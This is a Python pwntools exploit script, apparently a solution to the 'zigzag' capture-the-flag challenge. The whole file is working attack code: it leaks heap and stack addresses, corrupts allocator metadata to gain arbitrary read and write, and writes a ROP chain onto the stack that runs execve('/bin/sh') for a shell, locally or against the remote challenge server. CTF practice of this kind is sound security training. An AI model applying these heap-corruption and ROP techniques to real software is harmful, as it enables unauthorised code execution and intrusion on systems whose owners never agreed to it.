from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './zigzag'
HOST = 'be.ax'
PORT = 31278

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a(idx, size, data):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', str(size))
	r.sendafter(': ', data)

def d(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', str(idx))

def s(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', str(idx))

def e(idx, size, data):
	r.sendlineafter('> ', '4')
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', str(size))
	r.sendafter(': ', data)

r = start()

# leak heap address from meta
a(0, 0x8, 'a'*8)
e(0, 0x1018, 'b'*8)
s(0)
r.recv(0x1000)
leak = u64(r.recv(8))
leak = u64(r.recv(8))
leak = u64(r.recv(8))
dbg('leak')
binsh = leak + 0x1000

chunk0 = 0x208140

# overwrite next pointer to head of our list
e(0, 0x1018, b'\x41'*0x1000 + flat(u64(b"/bin/sh\x00"), 0x31337, chunk0))

# edit list to gain aar/w
a(1, 0x8, p64(chunk0))
e(1, 0x8, p64(0x31337))
e(1, 0x20, flat(0x208100, 8))

# leak stack address
s(2)
leak = u64(r.recv(8))
dbg('leak')
target = leak - 0xd0
e(1, 0x20, flat(target, 0x100))
if args.D:
	debug(r, [0x3662])
rax_sc = 0x00201fcf
rsi = 0x0020351b
rdi = 0x00203147
xor_edx = 0x00203030

# overwrite stack to rop
e(2, 0x100, flat(xor_edx, rdi, binsh, rsi, 0, rax_sc, 0x3b, 0xdeadbeef))

r.interactive()
r.close()
